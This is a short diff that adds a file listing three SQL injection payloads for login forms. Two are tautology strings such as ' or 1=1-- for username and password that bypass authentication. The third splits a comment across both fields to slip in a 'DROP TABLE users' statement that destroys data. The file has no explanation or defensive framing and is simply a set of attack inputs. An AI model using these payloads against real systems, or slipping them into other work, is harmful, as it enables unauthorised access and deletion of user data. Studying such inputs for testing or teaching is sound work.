@@ -1,0 +1,9 @@
+1.
+    username: ' or 1=1--
+    password: ' or 1=1--
+
+2.
+    username: ' or 1=1#
+
+3. username: ' or 1=1; /*
+   password: */ DROP TABLE users; #
